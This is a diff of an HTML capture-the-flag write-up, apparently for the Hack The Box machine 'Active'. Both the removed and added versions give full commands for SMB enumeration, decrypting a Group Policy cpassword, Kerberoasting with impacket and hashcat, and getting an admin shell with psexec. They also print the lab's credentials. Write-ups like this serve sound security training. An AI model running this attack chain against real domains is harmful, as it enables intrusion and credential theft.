@@ -7,6 +7,121 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>Active</h1><br/><p>Nmap portscan</p><p>	</p><p>	<strong>nmap &lt;IP&gt; -Pn -sT --open --stats-every=5s --reason -oN scan_active.txt</strong></p><p></p><p><img src="images/149-1.png" alt="images/149-1.png" /></p><p></p><p>See only Open Ports Number</p><p>	</p><p>	<strong>grep &#39;open&#39; scan_active.txt | awk &#39;{print $1}&#39; | cut -d&#39;/&#39; -f1</strong></p><p>	</p><p>Enumerate Ports with comma</p><p>	</p><p><strong>	grep &#39;open&#39; scan_active.txt | awk &#39;{print $1}&#39; | cut -d&#39;/&#39; -f1 | paste -sd &#39;,&#39; </strong></p><p>	</p><p>With the open ports we can be more specific finding version and executing scripts</p><p></p><p><img src="images/149-2.png" alt="images/149-2.png" /></p><p></p><p>Important check UDP ports for SNMP and other common protocols</p><p></p><p><img src="images/149-3.png" alt="images/149-3.png" /></p><p></p><p>Its a Windows machine so its probably that there is some juicy info in the SMB protocol</p><p></p><p>I execute enum4linux</p><p></p><p><img src="images/149-4.png" alt="images/149-4.png" /></p><p></p><p><img src="images/149-5.png" alt="images/149-5.png" /></p><p></p><p>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p><p></p><p>We can see that I can readonly the directorie Replication </p><p></p><p>		<strong>smbmap -H 10.10.10.100</strong> (we can use enum4linux too)</p><p>	</p><p><img src="images/149-6.png" alt="images/149-6.png" /></p><p></p><p>For see in a recursive mode</p><p></p><p><img src="images/149-7.png" alt="images/149-7.png" /></p><p></p><p>I find Groups.xml</p><p></p><p>I Download the file and after this i will see what it has</p><p></p><p>There are a username and a password</p><p></p><p>active.htb\SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</p><p></p><p><img src="images/149-8.png" alt="images/149-8.png" /></p><p></p><p>I search more about The cpassword and i find this:</p><p><a href="https://learn.microsoft.com/es-es/archive/blogs/ash/dont-set-or-save-passwords-using-group-policy-preferences">https://learn.microsoft.com/es-es/archive/blogs/ash/dont-set-or-save-passwords-using-group-policy-preferences</a></p><p></p><p>I decrypt it with gpp-decrypt and i find the password:</p><p></p><p><img src="images/149-9.png" alt="images/149-9.png" /></p><p></p><p>I have a pass and a username → active.htb:GPPstillStandingStrong2k18</p><p></p><p>Now i have access to Users Folder</p><p></p><p><strong>smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18</strong></p><p></p><p><img src="images/149-10.png" alt="images/149-10.png" /></p><p></p><p>I enter with smbclient</p><p></p><p><strong>smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18</strong></p><p></p><p><img src="images/149-11.png" alt="images/149-11.png" /></p><p></p><p>in SVC_TGS I have the user.txt flag</p><p></p><p><img src="images/149-12.png" alt="images/149-12.png" /></p><p></p><p>ldapsearch can now be used to query the Domain Controller for Active Directory UserAccountControlattributes of active accounts</p><p></p><p><strong>ldapsearch -x -H &#39;ldap://10.10.10.100&#39; -D &#39;SVC_TGS&#39; -w &#39;GPPstillStandingStrong2k18&#39; -b&quot;dc=active,dc=htb&quot; -s sub &quot;(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))&quot; samaccountname | grep sAMAccountName</strong></p><p></p><p>mpacket’s GetADUsers simplifies the process of enumerating domain user accounts</p><p></p><p><strong>impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100</strong></p><p></p><p>I think its vulnerable to Kerberoasting. When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate. It encrypts a response to you with the service user’s password hash. You send that response to the service, which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.</p><p></p><p>In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service, you will use off-line brute force to crack the password associated with the service.</p><p></p><p>Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with UserAccountControl setting “Do not require Kerberos preauthentication” enabled, it is possible to request and receive a ticket to crack without a valid account on the domain.</p><p></p><p>For get the hash</p><p></p><p><strong>impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out</strong></p><p></p><p>For crack the hash offline </p><p></p><p><strong>hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</strong></p><p></p><p>We have the admin password </p><p></p><p><img src="images/149-13.png" alt="images/149-13.png" /></p><p></p><p>Now i make a enum with smbmap </p><p></p><p><strong>smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968</strong></p><p></p><p><img src="images/149-14.png" alt="images/149-14.png" /></p><p></p><p>I connect with smbclient and i obtain the root_flag.txt</p><p></p><p><strong>smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968</strong></p><p></p><p>If i can write in the shares and i have admin access i can get a shell with psexec from impacket</p><p></p><p><strong>impacket-psexec active.htb/administrator@10.10.10.100</strong></p><p></p><p><img src="images/149-15.png" alt="images/149-15.png" /></p></div>
+  <div class="page">
+    <h1 class="title">Active</h1>
+
+    <section>
+      <h2>Port Scanning</h2>
+      <p>
+        I start by scanning the target machine to identify open TCP ports using a basic TCP scan:
+      </p>
+      <pre><code>nmap &lt;IP&gt; -Pn -sT --open --stats-every=5s --reason -oN scan_active.txt</code></pre>
+      <img src="images/149-1.png" alt="Open ports scan" />
+      <p>
+        To extract just the open port numbers:
+      </p>
+      <pre><code>grep 'open' scan_active.txt | awk '{print $1}' | cut -d'/' -f1</code></pre>
+      <p>
+        And to enumerate them as a comma-separated list for more specific scans:
+      </p>
+      <pre><code>grep 'open' scan_active.txt | awk '{print $1}' | cut -d'/' -f1 | paste -sd ','</code></pre>
+      <p>
+        Using these open ports, I can perform service enumeration with version detection and NSE scripts.
+      </p>
+      <img src="images/149-2.png" alt="Service enumeration" />
+      <p>
+        UDP ports are also checked for SNMP and other common services.
+      </p>
+      <img src="images/149-3.png" alt="UDP ports scan" />
+    </section>
+
+    <section>
+      <h2>Windows SMB Enumeration</h2>
+      <p>
+        This target is a Windows machine, so SMB could reveal sensitive information. I start with <strong>enum4linux</strong>:
+      </p>
+      <img src="images/149-4.png" alt="enum4linux output" />
+      <img src="images/149-5.png" alt="enum4linux details" />
+      <p>
+        Known users include <strong>administrator, guest, krbtgt, domain admins, root</strong>. The SMB share <strong>Replication</strong> is readable.
+      </p>
+      <pre><code>smbmap -H 10.10.10.100</code></pre>
+      <img src="images/149-6.png" alt="SMB share enumeration" />
+      <p>To recursively view contents:</p>
+      <img src="images/149-7.png" alt="Recursive SMB enumeration" />
+      <p>
+        I find <strong>Groups.xml</strong> which contains a username and encrypted password:
+      </p>
+      <img src="images/149-8.png" alt="Groups.xml cpassword" />
+    </section>
+
+    <section>
+      <h2>Decrypting GPP Password</h2>
+      <p>
+        The cpassword is a Group Policy Preference password. Using <strong>gpp-decrypt</strong>, I reveal:
+      </p>
+      <img src="images/149-9.png" alt="Decrypted password" />
+      <p>
+        Now I have credentials: <strong>active.htb\SVC_TGS:GPPstillStandingStrong2k18</strong>
+      </p>
+    </section>
+
+    <section>
+      <h2>Access Users Folder</h2>
+      <pre><code>smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18</code></pre>
+      <img src="images/149-10.png" alt="SMB map Users folder" />
+      <p>
+        I connect using <strong>smbclient</strong> to retrieve files and access the <strong>user.txt</strong> flag:
+      </p>
+      <pre><code>smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18</code></pre>
+      <img src="images/149-11.png" alt="SMB client access" />
+      <img src="images/149-12.png" alt="user.txt flag" />
+    </section>
+
+    <section>
+      <h2>Active Directory Enumeration</h2>
+      <p>
+        Using LDAP queries, I enumerate domain users:
+      </p>
+      <pre><code>ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName</code></pre>
+      <p>
+        Alternatively, Impacket’s <strong>GetADUsers</strong> can simplify domain user enumeration:
+      </p>
+      <pre><code>impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100</code></pre>
+    </section>
+
+    <section>
+      <h2>Kerberoasting Attack</h2>
+      <p>
+        I target service accounts for Kerberoasting, extracting service tickets to crack offline:
+      </p>
+      <pre><code>impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out</code></pre>
+      <p>
+        Cracking the hash offline using <strong>hashcat</strong> gives the administrator password:
+      </p>
+      <pre><code>hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</code></pre>
+      <img src="images/149-13.png" alt="Cracked admin password" />
+    </section>
+
+    <section>
+      <h2>Accessing Administrator Shares</h2>
+      <p>
+        Using the admin credentials, I enumerate all SMB shares:
+      </p>
+      <pre><code>smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968</code></pre>
+      <img src="images/149-14.png" alt="Admin SMB enumeration" />
+      <p>
+        Connecting via <strong>smbclient</strong>, I retrieve the <strong>root_flag.txt</strong>:
+      </p>
+      <pre><code>smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968</code></pre>
+      <p>
+        With write access and administrative privileges, I can also obtain a remote shell using <strong>Impacket’s psexec</strong>:
+      </p>
+      <pre><code>impacket-psexec active.htb/administrator@10.10.10.100</code></pre>
+      <img src="images/149-15.png" alt="Remote shell via psexec" />
+    </section>
+
+  </div>
 </body>
+
 </html>
